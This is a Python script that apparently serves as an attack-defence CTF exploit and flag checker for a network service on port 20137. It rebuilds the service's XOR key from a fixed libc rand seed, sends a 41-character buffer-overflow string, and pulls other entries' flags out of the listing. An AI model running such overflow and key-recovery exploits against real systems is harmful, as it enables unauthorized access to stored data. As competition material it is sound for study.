import sys, socket
import time
import ctypes
from random import randint
from pwn import *

LIBC = ctypes.cdll.LoadLibrary("libc.so.6")
seed = 0xC007F00
nb_rand = 3000
LIBC.srand(seed)
secret_key = ""
for i in range(0, nb_rand) :
	secret_key += chr(LIBC.rand()%256)


def xor_with_secret(message,key) :
 counter = 0
 length = len(message)
 xored_message = ""
 for i in range(0, length) :
   xored_message += chr(ord(message[counter]) ^ ord(key[counter]))
   counter += 1
 return xored_message

def decompose_recv(message,key) :
  if len(message) != 0 :
     first_message_length = ord(message[3])+256*ord(message[2])+256*256*ord(message[1])+256*256*256*ord(message[0])
     first_message = message[4:4+first_message_length]
     rest = message[4+first_message_length:]
     decoded_message = ""
     decoded_message += xor_with_secret(first_message,key)
     decoded_message += decompose_recv(rest,key)
     return decoded_message
  else :
     return ""

def compose_recv(message, key) :
# print(message)
 length = len(message)
 length_1stbyte = length%256
 length_2ndbyte = (length%(256**2) - length%256)/256
 length_3rdbyte = (length%(256**3) - length%(256**2))/(256**2)
 length_4thbyte = (length - length%(256**3))/(256**3)
 return chr(length_4thbyte)+chr(length_3rdbyte)+chr(length_2ndbyte)+chr(length_1stbyte)+xor_with_secret(message, secret_key)

def get_flag(host, port, flag_id, token):
	

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,20137))
	
	s.send(compose_recv('l', secret_key))
	time.sleep(0.1)
	wtf_ack = s.recv(4096)
  	#print(decompose_recv(wtf_ack, secret_key))
	
	#buffer overflow
	s.send(compose_recv('41 random characters is all i need !!!!!!', secret_key))
	time.sleep(0.1)
	ack = s.recv(4096)
	
	s.send(compose_recv('a', secret_key))
	time.sleep(0.1)
	ack = s.recv(99999)
	
	response = decompose_recv(ack, secret_key)
	
	target_occurence = response.find("Name: "+flag_id+'\nSource IP')
	
	target_infos = response[target_occurence:]
	flag_occurence = target_infos.find("Comment: ")
	flag_beginning = target_infos[flag_occurence:]
	end_of_flag_occurence = flag_beginning.find("\n")	
	
	flag = flag_beginning[9:end_of_flag_occurence]
	
	s.close()
	
	return flag
		
def set_flag(host, port, flag):
	username = genRndString()
	token = genRndString()
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,20137))
	
	s.send(compose_recv('s', secret_key))
	time.sleep(0.1)
	ack = s.recv(4096)
	#print(decompose_recv(ack, secret_key))

	s.send(compose_recv(username, secret_key))
	time.sleep(0.1)
	ack = s.recv(4096)
	#print(decompose_recv(ack, secret_key))

	s.send(compose_recv('1.2.3.4', secret_key))
	time.sleep(0.1)
	ack = s.recv(4096)
	#print(decompose_recv(ack, secret_key))

	s.send(compose_recv('5.6.7.8', secret_key))
	time.sleep(0.1)
	ack = s.recv(4096)
	#print(decompose_recv(ack, secret_key))

	s.send(compose_recv(flag, secret_key))
	time.sleep(0.1)
	ack = s.recv(4096)
	#print(decompose_recv(ack, secret_key))
	
	s.close()
	
	return {"flag_id": username, "token": token}

def genRndString():
        rang = randint(8,16)
        rndString = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(rang))
        return rndString
